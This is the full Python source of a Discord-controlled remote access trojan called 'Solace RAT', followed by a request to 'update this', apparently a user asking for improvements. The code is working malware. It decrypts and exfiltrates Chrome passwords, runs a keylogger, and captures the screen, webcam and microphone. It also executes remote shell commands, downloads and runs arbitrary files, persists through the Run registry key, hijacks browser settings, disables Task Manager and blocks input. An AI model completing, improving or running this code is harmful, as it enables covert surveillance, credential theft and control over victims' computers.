import os
import sys
import threading
import tkinter as tk
from tkinter import ttk
import discord
import sqlite3
import asyncio
import ctypes
import json
import psutil
import win32crypt
import base64
import requests
import datetime
import platform
import numpy as np
import subprocess
import webbrowser
import logging
import pyautogui
import socket
import pyperclip
import pygame
import winreg
import shutil
import wave
import pyaudio
from PIL import ImageGrab
from io import BytesIO
from discord.ext import commands
from discord import File, Embed
from mss import mss
from pynput.keyboard import Key, Listener
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Discord Bot Configuration
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
config = {
    'token': 'not_Stealing_my_token',
    'server_id': '1350570142681141381'
}
sessions = {}
keylogger_channels = {}
mic_recording_channels = {}

def setup_browser_hijack():
    try:
        troll_website = "https://trollface.dk/"
        key_path = r"Software\Microsoft\Internet Explorer\SearchScopes"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DefaultScope", 0, winreg.REG_SZ, troll_website)
        search_terms = ["how to clear my pc", "how to de-malware my pc"]
        for term in search_terms:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{term}") as key:
                winreg.SetValueEx(key, "URL Protocol", 0, winreg.REG_SZ, "")
                with winreg.CreateKey(key, "shell\\open\\command") as command_key:
                    winreg.SetValueEx(command_key, None, 0, winreg.REG_SZ, f'"{sys.executable}" -c "import webbrowser; webbrowser.open(\'{troll_website}\')"')
        print("Browser hijack setup complete.")
    except Exception as e:
        print(f"Failed to set up browser hijack: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Command doesn't exist :skull:")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="Solace RAT Version 1 | made by solace"))
    server = bot.get_guild(int(config['server_id']))
    if server:
        category = discord.utils.get(server.categories, name='Sessions')
        if not category:
            category = await server.create_category_channel('Sessions')
        pcn = socket.gethostname().lower()
        session = discord.utils.get(category.channels, name=pcn)
        if session:
            sessions[pcn] = session
            print(f"Reconnected to session '{pcn}' in {category.name}.")
        else:
            session = await category.create_text_channel(pcn)
            sessions[pcn] = session
            print(f"New session '{pcn}' created in {category.name}.")
        keylogger_channel = discord.utils.get(category.channels, name=f'{pcn}_keylogger')
        if not keylogger_channel:
            keylogger_channel = await category.create_text_channel(f'{pcn}_keylogger')
            keylogger_channels[pcn] = keylogger_channel
            print(f"New keylogger channel '{keylogger_channel.name}' created in {category.name}.")
        mic_recording_channel = discord.utils.get(category.channels, name=f'{pcn}_mic_recording')
        if not mic_recording_channel:
            mic_recording_channel = await category.create_text_channel(f'{pcn}_mic_recording')
            mic_recording_channels[pcn] = mic_recording_channel
            print(f"New microphone recording channel '{mic_recording_channel.name}' created in {category.name}.")
        embed = discord.Embed(
            title="Solace Rat Connected" if session else "Solace Rat Reconnected",
            description=f"""Your Session Key is {pcn} :white_check_mark:
**Use .help for Commands**""",
            color=discord.Color.green()
        )
        await session.send(embed=embed) if session else None
    else:
        print("Server not found.")
    setup_browser_hijack()

@bot.command()
async def help(ctx):
    message = """```
Remote Desktop:
  .screenshot <sessionkey>: Takes a screenshot of the user's PC
  .record <sessionkey>: Records the user's screen for 30 seconds
  .webcam <sessionkey>: Captures a picture from the user's webcam
Information Gathering:
  .time <sessionkey>: Retrieves the user's date and time
  .Ipinfo <sessionkey>: Retrieves the user's IP information
  .sysinfo <sessionkey>: Retrieves the user's system information#
  .cpass <sessionkey>: Obtains Targets Chrome Passwords
  .usage <sessionkey>: Tells you the users disk and cpu usage
  .startkeylogger <sessionkey>: Logs Key Strokes 
  .stopkeylogger <sessionkey>: Stops KeyStrokes
  .dumpkeylogger <sessionkey>: Dumps key log.txt from target machines
  .clipboard <sessionkey>: Sends last few copied items using winReg lib.
File Management:
  .website <sessionkey> <https://example.com>: Sends the user to a website of choice
  .getdownloads <sessionkey>: Gets all Users files in downloads folder
  .download <sessionkey>: Can download any file in their downloads folder
System Control:
  .restart <sessionkey>: Restarts the user's computer
  .shutdown <sessionkey>: Shuts down the user's computer
  .screenoff <sessionkey>: Turns off victims monitor
  .screenon <sessionkey>: Turns Victims monitor back on
  .dismgr <sessionkey>: Disables Targets Task Manager
  .enablemgr <sessionkey>: Enable Targets Task Manager
  .blockin <sessionkey>: Blocks Targets Keyboard / Mouse Input
  .unblockin <sessionkey>: Un-Blocks Targets Keyboard / Mouse Input
```
"""
    message2 = """```
Malware Commands
  .upload <sessionkey> <filelink>: Uploads and downloads file and then runs it on victims pc
  .startup <sessionkey>: puts rat on startup
  .ddos <sessionkey>: COMING SOON
  .spread <sessionkey>: COMING SOON
  .roblox <sessionkey>: COMING SOON
  .exodus <sessionkey>: COMING SOON
------------------------------------------------------------------------------------------
Troll Commands:
  .fp <sessionkey>: this spams furry stuff browsers on victims browser to flood their history
  .fork <sessionkey>: forkbombs their computer using simple batch script
  .rickroll <sessionkey>: rickrolls their computer for 30 seconds and they cannot escape
  .music <sessionkey> <file_attachment>: plays music on their computer
  .bluescreen <sessionkey>: Done
  .winspam <sessionkey>: Spams A Browser Windows [warning cant stop it]
------------------------------------------------------------------------------------------
```
"""
    message3 = """```
------------------------------------Example Shell Commands-----------------------------------------------
Remote Shell Commands:
  .shell <sessionkey> <command>: Executes a command on the victim's computer
        └ getmac [ Obtain Machines Mac Address's ]
          └ ipconfig [ Obtain Machines Ip Configuration ]
            └ tracert [ track the pathway a packet takes from a source IP to the destination address ]
              └ netstat [ Provides list of current Open Ports ]
------------------------------------------------------------------------------------------
```
"""
    await ctx.send(message)
    await ctx.send(message2)
    await ctx.send(message3)

@bot.command()
async def bluescreen(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        nt_os_path = r"C:\Windows\System32\toskrnl.exe"
        ke_bugcheck_path = r"C:\Windows\System32\keBugCheck.exe"
        if not os.path.exists(nt_os_path) or not os.path.exists(ke_bugcheck_path):
            logging.warning("Failed to trigger blue screen: One or both of the required files are missing.")
            await ctx.send("Failed to trigger blue screen :sadge:")
            return
        try:
            os.system(f'"{ke_bugcheck_path}" {nt_os_path}')
            await ctx.send(f"Blue screen triggered on session :rofl:")
        except Exception as e:
            logging.error(f"Failed to trigger blue screen: {e}")
            await ctx.send("Failed to trigger blue screen :sadge:")
    else:
        pass

@bot.command()
async def clipboard(ctx, seshn: str, limit: int = 10):
    session = sessions.get(seshn.lower())
    if session:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", 0, winreg.KEY_READ)
            i = 0
            clipboard_contents = []
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    clipboard_contents.append(value)
                    i += 1
                except WindowsError:
                    break
            winreg.CloseKey(key)
            clipboard_contents = clipboard_contents[-limit:]
            await ctx.send("\n".join(clipboard_contents))
        except WindowsError:
            await ctx.send("Failed to retrieve clipboard contents.")
    else:
        pass

@bot.command()
async def screenshot(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        with mss() as sct:
            sct.shot(output=os.path.join(os.getenv('TEMP'), "monitor.png"))
        file = discord.File(os.path.join(os.getenv('TEMP'), "monitor.png"), filename="monitor.png")
        await ctx.send("[*] Command successfully executed", file=file)
        os.remove(os.path.join(os.getenv('TEMP'), "monitor.png"))
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def dismgr(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        try:
            os.system("REG add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
            await ctx.send(f"**[ INFO ] Successfully Disabled {seshn} Task Manager** :white_check_mark:")
        except Exception as e:
            await ctx.send(f"""**[ ERROR ] Unable to Disable task Manager Due to the following Error**
```js
{e}
```""")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def enablemgr(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        try:
            os.system("REG add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
            await ctx.send(f"**[ INFO ] Successfully Enabled {seshn} Task Manager** :white_check_mark:")
        except Exception as e:
            await ctx.send(f"""**[ ERROR ] Unable to Enable task Manager Due to the following Error**
```js
{e}
```""")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def blockin(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            ok = ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"[ INFO ] Successfully Blocked {seshn} Mouse and Keyboard Input :white_check_mark:")
        else:
            await ctx.send(f"[ ERROR ] Failed To Block {seshn}'s Mouse And Keyboard Input")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def unblockin(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            ok = ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"[ INFO ] Successfully Un-Blocked {seshn} Mouse and Keyboard Input :white_check_mark:")
        else:
            await ctx.send(f"[ ERROR ] Failed To Un-Block {seshn}'s Mouse And Keyboard Input")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def cpass(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        def chrometime(ch) -> str:
            return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=ch))

        def encryption_key():
            localsp = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            with open(localsp, "r", encoding="utf-8") as f:
                ls = f.read()
                ls = json.loads(ls)
            key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        def decrypt_password(pw, key) -> str:
            try:
                iv = pw[3:15]
                password = pw[15:]
                cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
                decryptor = cipher.decryptor()
                return decryptor.update(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""

        def main():
            temp = os.getenv("TEMP")
            pwpath = f"{temp}\\{os.getlogin()}-GooglePasswords.txt"
            if os.path.exists(pwpath):
                os.remove(pwpath)
            with open(pwpath, "a") as ddd:
                key = encryption_key()
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
                filename = f"{temp}\\ChromeData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = decrypt_password(row[3], key)
                    date_created = row[4]
                    date_last_used = row[5]
                    if username or password:
                        ddd.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nDate Last Used: {str(chrometime(date_last_used))}\nDate Created: {str(chrometime(date_created))}\n")
                    else:
                        continue
                cursor.close()
                db.close()
                try:
                    os.remove(filename)
                except:
                    pass

        main()
        temp = os.getenv("TEMP")
        file = discord.File(f"{temp}\\{os.getlogin()}-GooglePasswords.txt", f"{os.getlogin()}-GooglePass.txt")
        await ctx.send(f"{os.getlogin()}'s Google Passwords:", file=file)
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def winspam(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        embed = discord.Embed(
            title=f'[!] Commands : .winspam on {seshn} Has Been Executed Successfully ',
            description=f'[!!] Warning This Cannot Be stopped Untill PC has Crashed or Shutdown',
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        while True:
            os.startfile("chrome.exe")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def startkeylogger(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        keylogger_channel = keylogger_channels.get(seshn.lower())
        if keylogger_channel:
            temp = os.getenv("TEMP")
            log_file_path = os.path.join(temp, "key_log.txt")
            logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
            sentence = ""
            def keylog():
                nonlocal sentence
                def on_press(key):
                    nonlocal sentence
                    if key == Key.enter:
                        logging.info(sentence)
                        sentence = ""
                    else:
                        sentence += str(key) + " "
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await ctx.send("[*] Keylogger successfully started")
            await keylogger_channel.send("[*] Keylogger started logging")
        else:
            await ctx.send("Keylogger channel not found")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def stopkeylogger(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        keylogger_channel = keylogger_channels.get(seshn.lower())
        if keylogger_channel:
            test._running = False
            await ctx.send("[*] Keylogger successfully stopped")
            await keylogger_channel.send("[*] Keylogger stopped logging")
        else:
            await ctx.send("Keylogger channel not found")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def dumpkeylogger(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        temp = os.getenv("TEMP")
        file_keys = os.path.join(temp, "key_log.txt")
        if os.path.exists(file_keys):
            file = discord.File(file_keys, filename="key_log.txt")
            await ctx.send(f"[*] Here Are the key Strokes", file=file)
        else:
            await ctx.send("Key log file not found")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def time(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        ctime = datetime.datetime.now().strftime("%H:%M:%S")
        cdate = datetime.date.today().strftime("%Y-%m-%d")
        await ctx.send(f"The users current time > {ctime}")
        await ctx.send(f"The users current date > {cdate}")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def ipinfo(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        url = "http://ipinfo.io/json"
        response = requests.get(url)
        data = response.json()
        embed = discord.Embed(title="Solace Rat - IP LOG", description="IP INFO", color=discord.Color.purple())
        embed.add_field(name=":globe_with_meridians: IP", value=f"```{data['ip']}```", inline=False)
        embed.add_field(name=":house: City", value=f"```{data['city']}```", inline=True)
        embed.add_field(name=":map: Region", value=f"```{data['region']}```", inline=True)
        embed.add_field(name=":earth_americas: Country", value=f"```{data['country']}```", inline=True)
        embed.add_field(name=":briefcase: Organization", value=f"```{data['org']}```", inline=False)
        await ctx.send(embed=embed)
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def sysinfo(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        si = platform.uname()
        embed = discord.Embed(title="System Information", color=discord.Color.purple())
        embed.add_field(name="System", value=f"```{si.system}```", inline=False)
        embed.add_field(name="Node Name", value=f"```{si.node}```", inline=True)
        embed.add_field(name="Release", value=f"```{si.release}```", inline=True)
        embed.add_field(name="Version", value=f"```{si.version}```", inline=True)
        embed.add_field(name="Machine", value=f"```{si.machine}```", inline=True)
        embed.add_field(name="Processor", value=f"```{si.processor}```", inline=True)
        await session.send(embed=embed)
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def record(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Recording started")
        start = datetime.datetime.now()
        duration = datetime.timedelta(seconds=30)
        frames = []
        while datetime.datetime.now() - start < duration:
            img = ImageGrab.grab()
            frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))
            await asyncio.sleep(0.1)
        height, width, _ = frames[0].shape
        outputf = "screen.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        videow = cv2.VideoWriter(outputf, fourcc, 10, (width, height))
        for frame in frames:
            videow.write(frame)
        videow.release()
        await ctx.send("Recording completed")
        await ctx.send(file=discord.File(outputf))
        os.remove(outputf)
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def errorbox(ctx, seshn: str, *, message: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Sent Errorbox whoopty Doo!")
        ctypes.windll.user32.MessageBoxW(None, message, "Error", 0)
        await ctx.send("They saw the error message.")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def website(ctx, seshn: str, websiteu: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            webbrowser.open(websiteu)
            await ctx.send(f"opened Website")
        except webbrowser.Error:
            await ctx.send("Failed")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def shutdown(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            os.system("shutdown /s /t 0")
            await ctx.send(f"Computer Shutdown")
        except os.OSError:
            await ctx.send("Failed")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def restart(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            os.system("shutdown /r /t 0")
            await ctx.send(f"Computer Restarted")
        except os.OSError:
            await ctx.send("Failed")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def webcam(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("Failed")
            return
        ret, frame = cap.read()
        if not ret:
            await ctx.send("Failed.")
            return
        output = "webcam.jpg"
        cv2.imwrite(output, frame)
        await session.send("", file=discord.File(output))
        os.remove(output)
        cap.release()
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def shell(ctx, seshn: str, *, command: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            with open("output.txt", "w") as file:
                file.write(output)
            await session.send(file=discord.File("output.txt"))
            os.remove("output.txt")
        except subprocess.CalledProcessError as e:
            await session.send(f"Command failed: {e}")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def usage(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        disku = psutil.disk_usage("/")
        totaldick = round(disku.total / (1024 ** 3), 2)
        useddick = round(disku.used / (1024 ** 3), 2)
        dickperc = disku.percent
        cpuperc = psutil.cpu_percent()
        embed = discord.Embed(title="System Usage", color=discord.Color.purple())
        embed.add_field(name="Session", value=seshn, inline=False)
        embed.add_field(name="Disk", value=f"```{useddick} GB / {totaldick} GB ({dickperc}%)```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpuperc}%```", inline=False)
        await session.send(embed=embed)
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def upload(ctx, seshn: str, filel: str):
    session = sessions.get(seshn.lower())
    if session:
        if not filel.startswith("https://cdn.discordapp.com"):
            await ctx.send("Invalid link. It must be a Discord attachment download link.")
            return
        try:
            response = requests.get(filel)
            if response.status_code == 200:
                filen = filel.split("/")[-1]
                filep = f"./{filen}"
                with open(filep, "wb") as file:
                    file.write(response.content)
                try:
                    subprocess.Popen(["start", filep], shell=True)
                except subprocess.SubprocessError:
                    await ctx.send("Failed to run the file.")
                else:
                    await ctx.send("File has been run.")
            else:
                await ctx.send("Failed to download the file.")
        except requests.exceptions.RequestException:
            await ctx.send("Error occurred during download.")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def getdownloads(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        downloadf = os.path.expanduser("~\\Downloads")
        files = os.listdir(downloadf)
        if not files:
            await session.send("No files found")
            return
        filel = "\n".join(files)
        with open("CdriveDownload.txt", "w", encoding="utf-8") as file:
            file.write(filel)
        await session.send("", file=discord.File("CdriveDownload.txt"))
        os.remove("CdriveDownload.txt")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def download(ctx, seshn: str, filename: str):
    session = sessions.get(seshn.lower())
    if session:
        download = os.path.expanduser("~\\Downloads")
        file = os.path.join(download, filename)
        if os.path.isfile(file):
            await session.send(f"Downloaded..", file=discord.File(file))
        else:
            await session.send("File not found")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def music(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Invalid file Please send an MP3 file in the message not a link or anything")
            return
        attachment = ctx.message.attachments[0]
        if not attachment.filename.endswith('.mp3'):
            await ctx.send("Invalid file extension")
            return
        download = os.path.join(os.getcwd(), attachment.filename)
        await attachment.save(download)
        pygame.mixer.init()
        try:
            pygame.mixer.music.load(download)
            await session.send("Playing Music...")
            pygame.mixer.music.play()
            playb = asyncio.create_task(con(pygame.mixer.music))
            while not playb.done():
                await bot.process_commands(ctx.message)
        finally:
            pygame.mixer.music.stop()
            pygame.mixer.quit()
            os.remove(download)
        await session.send("Finished playing the music.")
    else:
        await ctx.send("Invalid session key")

async def con(music_player):
    while music_player.get_busy():
        await asyncio.sleep(1)
    music_player.stop()

@bot.command()
async def fp(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        website = "https://www.pornhub.com/view_video.php?viewkey=63d567c6732bd"
        windows = 100
        for _ in range(windows):
            webbrowser.open(website)
        await session.send("Opening fp...")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def rickroll(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        videou = "https://cdn.discordapp.com/attachments/1350570142681141381/1098381234567890123/rickroll.mp4"
        response = requests.get(videou)
        with open('video.mp4', 'wb') as file:
            file.write(response.content)
        videop = subprocess.Popen(['start', 'video.mp4'], shell=True)
        await ctx.send("Rickrolled victim :)")
        await asyncio.sleep(30)
        videop.terminate()
        os.remove('video.mp4')
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def screenoff(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        WM_SYSCOMMAND = 0x0112
        SC_MONITORPOWER = 0xF170
        HWND_BROADCAST = 0xFFFF
        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        await ctx.send(f"Users Display Turned off :)")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def screenon(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
        await ctx.send("Victims Screen has turned back on...")
    else:
        await ctx.send("Invalid session key")

@bot.command()
async def startup(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        exe = 'Bootstrapper.exe'
        key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
        path = os.path.join(directory, exe)
        os.makedirs(directory, exist_ok=True)
        script_path = sys.argv[0]
        shutil.copy(script_path, path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)
        await ctx.send(f'Put Solace on startup :smiling_imp:')
    else:
        await ctx.send("Invalid session key")

async def record_mic(session_key):
    mic_recording_channel = mic_recording_channels.get(session_key)
    if mic_recording_channel:
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = 120
        WAVE_OUTPUT_FILENAME = "output.wav"
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()
        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        file = discord.File(WAVE_OUTPUT_FILENAME, filename=WAVE_OUTPUT_FILENAME)
        await mic_recording_channel.send("[*] Microphone recording complete", file=file)
        os.remove(WAVE_OUTPUT_FILENAME)

@bot.command()
async def startmicrecording(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        mic_recording_channel = mic_recording_channels.get(seshn.lower())
        if mic_recording_channel:
            await ctx.send("[*] Starting microphone recording every 2 minutes")
            while True:
                await record_mic(seshn.lower())
                await asyncio.sleep(120)  # Sleep for 2 minutes
        else:
            await ctx.send("Microphone recording channel not found")
    else:
        await ctx.send("Invalid session key")

bot.run(config['token']) update this pls and thanks
